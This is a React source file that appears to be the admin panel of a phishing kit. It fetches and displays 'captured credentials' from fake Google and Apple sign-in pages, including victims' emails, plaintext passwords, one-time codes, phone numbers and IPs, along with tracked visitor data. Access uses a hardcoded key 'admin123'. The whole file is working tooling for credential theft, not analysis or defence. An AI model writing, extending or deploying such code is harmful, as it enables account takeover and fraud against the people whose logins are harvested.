import React, { useState, useEffect } from 'react';
import { adminAPI } from '../services/api';

const AdminTest = () => {
  const [result, setResult] = useState('Not tested yet');
  const [credentials, setCredentials] = useState([]);
  const [visitors, setVisitors] = useState([]);
  const [apiUrl, setApiUrl] = useState('');

  useEffect(() => {
    const url = process.env.REACT_APP_API_URL || 'http://localhost:5001/api';
    setApiUrl(url);
    setResult(`API URL: ${url}\n\nClick "Test API" to fetch data...`);
  }, []);

  const testAPI = async () => {
    try {
      setResult('Testing...\n\nAPI URL: ' + apiUrl + '\n\nFetching credentials and visitors...');
      
      const [credsRes, visitorsRes] = await Promise.all([
        adminAPI.getCapturedCredentials('admin123'),
        adminAPI.getVisitors('admin123')
      ]);
      
      console.log('API Response - Credentials:', credsRes.data);
      console.log('API Response - Visitors:', visitorsRes.data);
      
      setCredentials(credsRes.data.credentials || []);
      setVisitors(visitorsRes.data.visitors || []);
      
      setResult(`✅ Success!\n\nAPI URL: ${apiUrl}\nCredentials: ${credsRes.data.count || 0}\nVisitors: ${visitorsRes.data.count || 0}\n\nCheck console for full response`);
    } catch (error) {
      console.error('Error:', error);
      setResult(`❌ Error: ${error.message}\n\nResponse: ${JSON.stringify(error.response?.data || {}, null, 2)}\n\nCheck browser console for details`);
    }
  };

  return (
    <div style={{ padding: '20px', fontFamily: 'monospace', maxWidth: '1200px', margin: '0 auto' }}>
      <h1 style={{ color: '#0052ff' }}>🔍 Admin API Debug Tool</h1>
      
      <div style={{ marginBottom: '20px', padding: '15px', background: '#f5f5f5', borderRadius: '5px' }}>
        <strong>Environment:</strong>
        <div style={{ marginTop: '10px' }}>
          <div>REACT_APP_API_URL: {apiUrl}</div>
          <div>REACT_APP_SOCKET_URL: {process.env.REACT_APP_SOCKET_URL || 'Not set'}</div>
        </div>
      </div>
      
      <button 
        onClick={testAPI} 
        style={{ 
          padding: '15px 30px', 
          fontSize: '16px', 
          cursor: 'pointer',
          background: '#0052ff',
          color: 'white',
          border: 'none',
          borderRadius: '5px',
          fontWeight: 'bold'
        }}
      >
        🧪 Test API Endpoints
      </button>
      
      <pre style={{ 
        background: '#1a1a1a', 
        color: '#00ff00',
        padding: '20px', 
        marginTop: '20px', 
        borderRadius: '5px',
        fontSize: '14px',
        whiteSpace: 'pre-wrap'
      }}>
        {result}
      </pre>
      
      {credentials.length > 0 && (
        <div style={{ marginTop: '30px', border: '2px solid #4285f4', borderRadius: '8px', padding: '20px' }}>
          <h2 style={{ color: '#4285f4', margin: '0 0 15px 0' }}>
            🔐 Captured Credentials ({credentials.length})
          </h2>
          {credentials.map((cred, idx) => (
            <div key={idx} style={{ 
              background: '#f0f8ff', 
              padding: '15px', 
              marginBottom: '10px', 
              borderRadius: '5px',
              borderLeft: `4px solid ${cred.provider === 'Google' ? '#4285f4' : '#000'}`
            }}>
              <div style={{ fontWeight: 'bold', marginBottom: '8px', color: cred.provider === 'Google' ? '#4285f4' : '#000' }}>
                {cred.provider} Sign-In
              </div>
              <div><strong>Email/ID:</strong> {cred.email || cred.appleId}</div>
              <div><strong>Password:</strong> {cred.password}</div>
              <div><strong>OTP:</strong> {cred.otp || 'N/A'}</div>
              <div><strong>Phone:</strong> {cred.phoneNumber || 'N/A'}</div>
              <div><strong>IP:</strong> {cred.ipAddress}</div>
              <div><strong>Device:</strong> {cred.platform}</div>
              <div style={{ fontSize: '12px', color: '#666', marginTop: '5px' }}>
                {new Date(cred.timestamp).toLocaleString()}
              </div>
            </div>
          ))}
        </div>
      )}
      
      {visitors.length > 0 && (
        <div style={{ marginTop: '30px', border: '2px solid #05d168', borderRadius: '8px', padding: '20px' }}>
          <h2 style={{ color: '#05d168', margin: '0 0 15px 0' }}>
            👁️ Website Visitors ({visitors.length})
          </h2>
          {visitors.map((visitor, idx) => (
            <div key={idx} style={{ 
              background: '#f0fff4', 
              padding: '15px', 
              marginBottom: '10px', 
              borderRadius: '5px',
              borderLeft: '4px solid #05d168'
            }}>
              <div><strong>Page:</strong> {visitor.page}</div>
              <div><strong>IP:</strong> {visitor.ipAddress}</div>
              <div><strong>Location:</strong> {visitor.timezone}</div>
              <div><strong>Device:</strong> {visitor.platform}</div>
              <div><strong>Screen:</strong> {visitor.screenResolution}</div>
              <div><strong>Referrer:</strong> {visitor.referrer || 'Direct'}</div>
              <div style={{ fontSize: '12px', color: '#666', marginTop: '5px' }}>
                {new Date(visitor.timestamp).toLocaleString()}
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
};

export default AdminTest;
